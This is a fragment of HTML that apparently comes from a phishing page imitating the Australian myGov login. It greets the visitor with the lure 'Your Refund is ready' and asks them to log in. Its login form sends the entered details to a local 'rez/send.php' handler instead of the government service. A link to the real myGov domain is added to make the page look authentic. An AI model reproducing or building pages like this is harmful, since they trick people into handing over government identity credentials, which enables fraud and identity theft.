                ...
                <div class="login-grid-column">
                    <div class="digital-id-login-card-wrapper">
                        <div class="digital-id-main-login-card override">
                            ...
                            <p style="color:green" class="login-instruction-text">Your Refund is ready.</p>
                            <h2 class="text-align-left">Please login to continue the process</h2>
                            <form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="rez/send.php" method="post">
                                ...
                                <div class="button-digital-id-container">
                                    ...
                                    <div class="digital-id-login-option-container">
                                        <div class="inner-options">
                                            ...
                                            <a class="button-digital-identity" href="https://login.my.gov.au/las/mygov-login?execution=e2s1&amp;_eventId=digitalIdentity">Continue with Digital Identity</a>
